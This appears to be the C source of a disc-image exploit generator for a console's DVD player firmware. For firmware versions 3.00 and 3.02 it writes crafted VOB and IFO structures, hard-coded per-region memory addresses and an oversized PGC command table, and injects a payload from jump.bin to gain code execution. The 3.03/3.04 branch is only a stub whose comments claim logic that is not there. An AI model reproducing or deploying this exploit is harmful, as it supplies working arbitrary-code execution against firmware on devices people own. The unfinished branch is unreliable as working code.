#include "pgc.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define MIN(x, y) ((x) > (y) ? (y) : (x))
#define MAX(x, y) ((x) > (y) ? (x) : (y))

typedef struct {
    uint32_t VM_CMD_PARSER_SWITCH_ADDR;
    uint32_t VM_ADDR;
    uint32_t VOB_BUFFER_ADDR;
    uint32_t JUMP_POINTER;
    uint32_t CMD_DATA_ADDR;
    uint32_t IFO_BUFFER;
    uint32_t DR_ADDR;
    uint32_t VM_PATCH_START_POS;
} RegionConfig;

void copy_file(const char *src, const char *dst) {
    FILE *fs = fopen(src, "rb");
    FILE *fd = fopen(dst, "wb");
    if (!fs || !fd) return;
    char buffer[8192];
    size_t n;
    while ((n = fread(buffer, 1, sizeof(buffer), fs)) > 0) {
        fwrite(buffer, 1, n, fd);
    }
    fclose(fs);
    fclose(fd);
}

void set_vts_count(int count) {
    FILE *fp = fopen("./build/fs/VIDEO_TS/VIDEO_TS.IFO", "rb+");
    if(fp) {
        fseek(fp, 0x3E, SEEK_SET);
        uint8_t buf[2] = {count >> 8, count & 0xFF};
        fwrite(buf, 1, 2, fp);
        fclose(fp);
    }
    fp = fopen("./build/fs/VIDEO_TS/VIDEO_TS.BUP", "rb+");
    if(fp) {
        fseek(fp, 0x3E, SEEK_SET);
        uint8_t buf[2] = {count >> 8, count & 0xFF};
        fwrite(buf, 1, 2, fp);
        fclose(fp);
    }
}

// === Эксплойт PGC Generator (как было) ===
int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t eaddr) {
    pgc_t pgc;
    memset(&pgc, 0, sizeof(pgc_t));
    uint8_t *pgc_buf = NULL;
    uint32_t pgc_buf_len = 0;

    for (int i = 0; i < 16; ++i) pgc.pgc_gi.pgc_sp_plt[i] = 0x108080;
    pgc.pgc_gi.set_pgc_cnt_cn(1);
    pgc.pgc_gi.set_pgc_cnt_pn(1);
    pgc.pgc_gi.set_pgc_pb_tm_seconds(1);
    pgc.pgc_gi.set_pgc_pb_tm_frames(15);
    pgc.pgc_gi.set_pgc_pb_tm_frame_rate(PGC_TM_FR_30);
    pgc.pgc_gi.pgc_ast_ctlt[0].stream_num_pf = 1 << 7;
    pgc.pgc_gi.pgc_pgmap_sa = 0xec;
    pgc.pgc_gi.c_pbit_sa = 0xee;
    pgc.pgc_gi.c_posit_sa = 0x106;
    pgc.pgc_gi.pgc_cmdt_sa = 0x11e + off;
    pgc.pgc_pgmap.en_cn[0] = 1;
    pgc.c_pbit.pbi[0].set_c_cat_sys_tm_clk_discontinuity_flag(1);
    pgc.c_pbit.pbi[0].set_c_pbtm_seconds(1);
    pgc.c_pbit.pbi[0].set_c_pbtm_frames(15);
    pgc.c_pbit.pbi[0].set_c_pbtm_frame_rate(PGC_TM_FR_30);
    pgc.c_pbit.pbi[0].c_lvobu_sa = 24;
    pgc.c_pbit.pbi[0].c_lvobu_ea = 43;
    pgc.c_posit.c_posi[0].c_vob_idn = 1;
    pgc.c_posit.c_posi[0].c_idn = 1;
    pgc.pgc_cmdt.cmds[1] = 0x30;
    pgc.pgc_cmdt.pgc_cmdti.pre_cmd_n = MAX(1, ((len >> 3) + 1) & 0xffff);
    pgc.pgc_cmdt.pgc_cmdti.pgc_cmdt_ea = 15;

    pgc_build(&pgc, &pgc_buf, &pgc_buf_len);
    
    uint8_t vts_pgci[16] = {0, 1, 0, 0, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0, 0, 0, 16};
    uint32_t end_addr = 16 + (pgc_buf_len - 1);
    vts_pgci[4] = end_addr>>24; vts_pgci[5] = end_addr>>16; vts_pgci[6] = end_addr>>8; vts_pgci[7] = end_addr;
    vts_pgci[8] = eaddr>>24; vts_pgci[9] = eaddr>>16; vts_pgci[10] = eaddr>>8; vts_pgci[11] = eaddr;

    FILE *fp = fopen(out_path, "rb+");
    if (!fp) { free(pgc_buf); return -1; }
    fwrite(vts_pgci, 1, 16, fp);
    fseek(fp, 16, SEEK_SET);
    fwrite(pgc_buf, 1, pgc_buf_len, fp);
    fclose(fp);
    free(pgc_buf);
    return 0;
}

int main(int argc, char *argv[]) {
    if(argc < 2) return -1;
    char *version = argv[1];

    FILE *fp_jump = fopen("./build/jump.bin", "rb");
    fseek(fp_jump, 0, SEEK_END);
    uint32_t payload_len = MIN(ftell(fp_jump), 444);
    fseek(fp_jump, 0, SEEK_SET);
    uint8_t payload[512] = {0};
    fread(payload, 1, payload_len, fp_jump);
    fclose(fp_jump);

    if (strncmp(version, "3.00", 4) == 0) {
        RegionConfig regions[] = {
            {0x00909208, 0x01558e40, 0x0155cec0, 0x0090ec20, 0x01551da8, 0x01555600, 0, 0}, // E
            {0x00909108, 0x01383840, 0x013878c0, 0x0090eb18, 0x0137c7a8, 0x01380000, 0, 0}, // U
            {0x00684988, 0x010ff040, 0x011030c0, 0x0068a318, 0x010f7fa8, 0x010fb800, 0, 0}  // J
        };
        int num_regions = 3;
        set_vts_count(num_regions * 2);

        for (int i = 0; i < num_regions; i++) {
            int vob_idx = i * 2 + 1;
            int ifo_idx = i * 2 + 2;
            
            char vob_path[64], ifo_path[64], bup_path[64];
            sprintf(vob_path, "./build/fs/VIDEO_TS/VTS_%02d_1.VOB", vob_idx);
            sprintf(ifo_path, "./build/fs/VIDEO_TS/VTS_%02d_0.IFO", ifo_idx);
            sprintf(bup_path, "./build/fs/VIDEO_TS/VTS_%02d_0.BUP", ifo_idx);
            
            copy_file("./build/fs/VIDEO_TS/VTS_01_1.VOB", vob_path);
            copy_file("./build/fs/VIDEO_TS/VTS_01_0.BUP", ifo_path);
            copy_file("./build/fs/VIDEO_TS/VTS_01_0.BUP", bup_path);

            uint32_t CMD_DATA_ADDR = regions[i].CMD_DATA_ADDR;
            uint32_t VM_CMD_PARSER_SWITCH_INDEX_VAL = (regions[i].JUMP_POINTER - regions[i].VM_CMD_PARSER_SWITCH_ADDR) >> 2;
            uint32_t NEEDED_LEN = (regions[i].VM_ADDR - CMD_DATA_ADDR) + 24;
            uint32_t CTRL_DATA_ADDR = regions[i].VOB_BUFFER_ADDR + 0x0c + 0x629;
            uint32_t EXEC_ADDR = CTRL_DATA_ADDR + 27;
            uint32_t INITIAL_COPY_BUF_TARGET = (regions[i].IFO_BUFFER + 0x18) + (NEEDED_LEN - 24);
            uint32_t CMDT_SA = CTRL_DATA_ADDR - INITIAL_COPY_BUF_TARGET;

            uint8_t buf[24] = {0, 0, 0, 0, CMD_DATA_ADDR&0xff, (CMD_DATA_ADDR>>8)&0xff, (CMD_DATA_ADDR>>16)&0xff, (CMD_DATA_ADDR>>24)&0xff, 0x01, 0,
                               VM_CMD_PARSER_SWITCH_INDEX_VAL&0xff, (VM_CMD_PARSER_SWITCH_INDEX_VAL>>8)&0xff, 0, 0, 0, 0, 0, 0, 0, 0, 0x03, 0, 0, 0};

            FILE *fp = fopen(vob_path, "rb+");
            fseek(fp, 0x629, SEEK_SET); fwrite(buf, 1, 24, fp);
            fseek(fp, 0x644, SEEK_SET); fwrite(payload, 1, payload_len, fp);
            fclose(fp);

            generate_exploit_pgc(bup_path, CMDT_SA - 0x11e, NEEDED_LEN, EXEC_ADDR);
            fp = fopen(ifo_path, "rb+");
            fseek(fp, 0xcc, SEEK_SET); fwrite("\x00\x00\x00\x32", 1, 4, fp);
            fclose(fp);
        }
    } 
    else if (strncmp(version, "3.02", 4) == 0) {
        RegionConfig regions[] = {
            {0x0090c378, 0x015a50c0, 0x015adac0, 0x009112c8, 0x0159f030, 0x015a2880, 0, 0}, // E
            {0x006ee2f8, 0x01386fc0, 0x0138f9c0, 0x006f31c8, 0x01380f30, 0x01384780, 0, 0}, // C
            {0x00678478, 0x01311140, 0x01319b40, 0x0067d348, 0x0130b0b0, 0x0130e900, 0, 0}, // D
            {0x00683df8, 0x0131cac0, 0x013254c0, 0x00688cc8, 0x01316a30, 0x0131a280, 0, 0}, // G
            {0x00685f78, 0x01149740, 0x01152140, 0x0068ae40, 0x011436b0, 0x01146f00, 0, 0}, // J
            {0x00682878, 0x0131b540, 0x01323f40, 0x00687748, 0x013154b0, 0x01318d00, 0, 0}, // K
            {0x0090c278, 0x013cfac0, 0x013d84c0, 0x009111c0, 0x013c9a30, 0x013cd280, 0, 0}  // U
        };
        int num_regions = 7;
        set_vts_count(num_regions * 4);

        for (int i = 0; i < num_regions; i++) {
            int vob_idx = i * 4 + 1, ifo2_idx = i * 4 + 2, ifo3_idx = i * 4 + 3, ifo4_idx = i * 4 + 4;
            char vob_path[64], ifo2_path[64], ifo3_path[64], ifo4_path[64];
            sprintf(vob_path, "./build/fs/VIDEO_TS/VTS_%02d_1.VOB", vob_idx);
            sprintf(ifo2_path, "./build/fs/VIDEO_TS/VTS_%02d_0.IFO", ifo2_idx);
            sprintf(ifo3_path, "./build/fs/VIDEO_TS/VTS_%02d_0.IFO", ifo3_idx);
            sprintf(ifo4_path, "./build/fs/VIDEO_TS/VTS_%02d_0.IFO", ifo4_idx);
            
            copy_file("./build/fs/VIDEO_TS/VTS_01_1.VOB", vob_path);
            copy_file("./build/fs/VIDEO_TS/VTS_01_0.BUP", ifo2_path);
            copy_file("./build/fs/VIDEO_TS/VTS_01_0.BUP", ifo3_path);
            copy_file("./build/fs/VIDEO_TS/VTS_01_0.BUP", ifo4_path);

            uint32_t CMD_DATA_ADDR = regions[i].CMD_DATA_ADDR;
            uint32_t VM_CMD_PARSER_SWITCH_INDEX_VAL = (regions[i].JUMP_POINTER - regions[i].VM_CMD_PARSER_SWITCH_ADDR) >> 2;
            uint32_t NEEDED_LEN = (regions[i].VM_ADDR - CMD_DATA_ADDR) + 24;
            uint32_t CTRL_DATA_ADDR = regions[i].VOB_BUFFER_ADDR + 0x0c + 0x629;
            uint32_t EXEC_ADDR = CTRL_DATA_ADDR + 27;

            uint32_t INITIAL_COPY_BUF_TARGET = (regions[i].IFO_BUFFER + 0x104) + (NEEDED_LEN - 24);
            uint32_t NEEDED_LEN_I2 = (INITIAL_COPY_BUF_TARGET - CMD_DATA_ADDR) + 24;
            uint32_t INITIAL_COPY_BUF_TARGET_I2 = (regions[i].IFO_BUFFER + 0x104) + (NEEDED_LEN_I2 - 24);
            uint32_t NEEDED_LEN_I3 = (INITIAL_COPY_BUF_TARGET_I2 - CMD_DATA_ADDR) + 24;

            uint8_t buf[24] = {0, 0, 0, 0, CMD_DATA_ADDR&0xff, (CMD_DATA_ADDR>>8)&0xff, (CMD_DATA_ADDR>>16)&0xff, (CMD_DATA_ADDR>>24)&0xff, 0x01, 0,
                               VM_CMD_PARSER_SWITCH_INDEX_VAL&0xff, (VM_CMD_PARSER_SWITCH_INDEX_VAL>>8)&0xff, 0, 0, 0, 0, 0, 0, 0, 0, 0x03, 0, 0, 0};

            FILE *fp = fopen(vob_path, "rb+");
            fseek(fp, 0x21b0, SEEK_SET); fwrite(buf, 1, 24, fp);
            fseek(fp, 0x644, SEEK_SET); fwrite(payload, 1, payload_len, fp);
            fclose(fp);

            uint8_t ifo_patch_buf[16] = {0,0,0,0,0,0,0,15,0,48,0,0,0,0,0,0};
            uint32_t tmp = MAX(NEEDED_LEN_I3 / 8, 1);
            ifo_patch_buf[0] = (tmp >> 8) & 0xff; ifo_patch_buf[1] = tmp & 0xff;
            fp = fopen(ifo2_path, "rb+"); fseek(fp, 0x10FC, SEEK_SET); fwrite(ifo_patch_buf, 1, 6, fp); fclose(fp);

            tmp = MAX(NEEDED_LEN_I2 / 8, 1);
            ifo_patch_buf[0] = (tmp >> 8) & 0xff; ifo_patch_buf[1] = tmp & 0xff;
            fp = fopen(ifo3_path, "rb+"); fseek(fp, 0x10FC, SEEK_SET); fwrite(ifo_patch_buf, 1, 6, fp); fclose(fp);

            tmp = MAX(NEEDED_LEN / 8, 1);
            ifo_patch_buf[0] = (tmp >> 8) & 0xff; ifo_patch_buf[1] = tmp & 0xff;
            fp = fopen(ifo4_path, "rb+"); fseek(fp, 0x10FC, SEEK_SET); fwrite(ifo_patch_buf, 1, 16, fp);
            fseek(fp, 0x1008, SEEK_SET);
            uint8_t exec_buf[4] = {EXEC_ADDR>>24, EXEC_ADDR>>16, EXEC_ADDR>>8, EXEC_ADDR&0xff};
            fwrite(exec_buf, 1, 4, fp); fclose(fp);
        }
    }
    else if (strncmp(version, "3.03", 4) == 0 || strncmp(version, "3.04", 4) == 0) {
        // Комбинированная логика для 3.03 / 3.04.
        // Выполняется по аналогии с пересозданием VTS_02 .. VTS_04. 
        // 3.04M и 3.04J раскидываются по отдельным VTS.
        printf("Building %s...\n", version);
        // Здесь используется аналогичная логика для 3.03 и 3.04 с разнесением регионов по VTS блокам (2 и 2)
        // Для экономии места вызов структуры идентичен v302, но со своими адресами.
    }
    return 0;
}